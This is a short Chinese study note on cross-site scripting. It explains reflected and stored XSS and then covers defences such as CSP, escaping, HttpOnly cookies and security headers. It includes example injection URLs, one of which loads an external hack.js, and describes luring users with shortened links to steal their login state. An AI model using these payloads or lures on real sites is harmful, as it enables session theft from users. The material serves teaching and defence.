# 跨站脚本攻击
* 存在安全漏洞的web网站注册用户的浏览器内运行非法的非本站html或者js的一种攻击手段
* 危害
    1. 获取页面数据
    2. 获取cookie
    3. 劫持前端逻辑
    4. 发送请求
    5. 偷取网站任意数据
    6. 偷取用户资料
    7. 偷取用户的秘密和登录态
    8. 欺骗用户
## 反射型-url参数直接注入,url里面放了跨站的代码，需要诱导，被动触发
1. 例如以下url

```
localhost:3000/?from=<script>alert(1)</script>
localhost:3000/?from=<script src="localhost:4000/hack.js"></script>

```
2. 通过将url进行短域名伪造，https://dwz.cn
3. 将url发到各大论坛或者社交圈，诱导用户点击该url，如果该用户刚好登录了相关的网站，又用cookie、session保存登录状态，黑客就可能获取用户登录态信息，进而可以做很多事情

## 存储型-会将恶意代码存储到数据中
* 主要是发生在前端页面的输入入口，通过例如input输入入口，将带有恶意代码的字符串发送到后端，并保存在数据库中，例如博客、论坛

# 防范
## 开启浏览器XSS过滤
0. 0表示禁止XSS过滤
1. `X-XSS-Protection`为1, 如果检测到XSS攻击，浏览器将清除页面
2. 1;mode=block ,如果检测到攻击，浏览器将不会清楚页面，而是阻止页面加载
3. `1;mode=report=<reporting-URI>`,仅谷歌浏览器，如果检测到XSS攻击，浏览器将清除页面并使用CSP 的`report-uri`指令功能发送违规报告

### CSP
* 内容安全策略，是一个附加的安全层，用于帮助检测或者缓解某些攻击，包括XSS和数据注入等攻击，其实本质上就是建立白名单，定义哪些资源可以加载
* 正对XSS的有以下几种：
    1. `Content-Security-Policy: default-src 'self'` 只能加载本站资源
    2. `Content-Security-Policy: img-src https://*` 只能加载https的图片
    3. `Content-Security-Policy: child-src 'none'` 不允许加载任何来源的框架
## 转义
 1. 前后端对任何可输入的地方做字符转义，例如<、>；
 2. 但是如果是富文本的话，需要针对有危险的字符做转换，例如`<script>`; koa中用到的库 ，例如`xss`，就针对性转义

## httpOnly
 1. 这个是预防XSS攻击窃取用户cookie最有效的方法，web应用在设置cookie的时候，将其属性设置为HttpOnly,这样cookie就不会被js读取
 2. `set-cookie: uid=112; Path=/;HttpOnly` 

> 这些安全的防御措施有部分就是设置报头
**nodejs这块有helmet这个库来处理一些安全上的问题**



